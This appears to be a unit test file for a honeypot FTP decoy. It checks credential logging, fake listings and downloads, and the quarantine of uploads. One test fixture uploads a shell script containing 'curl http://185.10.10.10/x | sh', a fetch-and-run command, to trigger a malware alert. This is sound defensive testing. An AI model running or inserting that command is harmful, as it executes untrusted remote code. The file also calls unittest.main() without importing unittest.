"""FTP decoy end-to-end: login, PASV transfers, malware upload capture."""

from __future__ import annotations

import hashlib
import re
import socket
from pathlib import Path

from honeyforge.services.ftp import FtpHoneyService

from .util import HoneyTestCase, recv_all, recv_until


def parse_pasv(response: bytes) -> tuple:
    match = re.search(rb"\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)", response)
    assert match, f"bad PASV response: {response!r}"
    h1, h2, h3, h4, p1, p2 = (int(g) for g in match.groups())
    return f"{h1}.{h2}.{h3}.{h4}", p1 * 256 + p2


class FtpHoneyServiceTests(HoneyTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.service = FtpHoneyService("127.0.0.1", 0, self.bus,
                                       banner="220 HoneyForge FTP ready.",
                                       uploads_dir=self.tmp.name + "/uploads",
                                       save_uploads=True)
        self.start_service(self.service)
        self.sock = socket.create_connection(
            ("127.0.0.1", self.service.bound_port), timeout=5)
        self.addCleanup(self.sock.close)
        self.banner = recv_until(self.sock, b"\n")
        self.assertIn(b"220 HoneyForge FTP ready.", self.banner)

    def _cmd(self, text: str) -> bytes:
        self.sock.sendall((text + "\r\n").encode())
        return recv_until(self.sock, b"\n")

    def _pasv_connect(self) -> socket.socket:
        response = self._cmd("PASV")
        self.assertIn(b"227", response)
        host, port = parse_pasv(response)
        data_sock = socket.create_connection((host, port), timeout=5)
        self.addCleanup(data_sock.close)
        return data_sock

    def test_login_captures_credentials(self) -> None:
        self.assertIn(b"331", self._cmd("USER admin"))
        self.assertIn(b"230", self._cmd("PASS 123456"))
        self.wait_for(lambda: self.events.of_type("login_attempt"),
                      message="login_attempt event")
        login = self.events.of_type("login_attempt")[0]
        self.assertEqual(login.details["username"], "admin")
        self.assertEqual(login.details["password"], "123456")
        rows = self.storage.recent_logins(5)
        self.assertEqual(rows[0]["username"], "admin")
        self.assertEqual(rows[0]["password"], "123456")

    def test_syst_pwd_noop(self) -> None:
        self.assertIn(b"215 UNIX", self._cmd("SYST"))
        self.assertIn(b'257 "/"', self._cmd("PWD"))
        self.assertIn(b"200", self._cmd("NOOP"))

    def test_list_returns_fake_directory(self) -> None:
        self.assertIn(b"331", self._cmd("USER admin"))
        self._cmd("PASS pw")
        data_sock = self._pasv_connect()
        self._cmd("LIST")
        listing = recv_all(data_sock, timeout=3)
        self.assertIn(b"firmware.bin", listing)
        self.assertIn(b"config_backup.tgz", listing)
        done = recv_until(self.sock, b"\n")
        self.assertIn(b"226", done)

    def test_retr_serves_fake_file(self) -> None:
        self._cmd("USER admin")
        self._cmd("PASS pw")
        data_sock = self._pasv_connect()
        self._cmd("RETR firmware.bin")
        payload = recv_all(data_sock, timeout=3)
        self.assertEqual(len(payload), 1024)
        self.assertIn(b"226", recv_until(self.sock, b"\n"))

    def test_stor_captures_upload_and_raises_malware_alert(self) -> None:
        self._cmd("USER admin")
        self._cmd("PASS pw")
        data_sock = self._pasv_connect()
        payload = b"#!/bin/sh\ncurl http://185.10.10.10/x | sh\n"
        self.assertIn(b"150", self._cmd("STOR bot.sh"))
        data_sock.sendall(payload)
        data_sock.shutdown(socket.SHUT_WR)
        done = recv_until(self.sock, b"\n", timeout=10)
        self.assertIn(b"226", done)

        self.wait_for(lambda: self.events.of_type("file_upload"),
                      message="file_upload event")
        event = self.events.of_type("file_upload")[0]
        self.assertEqual(event.details["filename"], "bot.sh")
        self.assertEqual(event.details["size"], len(payload))
        expected = hashlib.sha256(payload).hexdigest()
        self.assertEqual(event.details["sha256"], expected)

        saved = sorted(Path(self.tmp.name, "uploads").glob("sha256_*"))
        self.assertTrue(saved, "upload was not written to the quarantine dir")
        self.assertEqual(saved[0].read_bytes(), payload)

        self.wait_for(
            lambda: any(a["alert_type"] == "malware_drop"
                        for a in self.storage.recent_alerts(10)),
            message="malware_drop alert",
        )
        alert = next(a for a in self.storage.recent_alerts(10)
                     if a["alert_type"] == "malware_drop")
        self.assertEqual(alert["severity"], "critical")

    def test_unknown_command_gets_500(self) -> None:
        self.assertIn(b"500", self._cmd("STRANGE THING"))

    def test_quit_closes_session(self) -> None:
        self.assertIn(b"221", self._cmd("QUIT"))


if __name__ == "__main__":
    unittest.main()
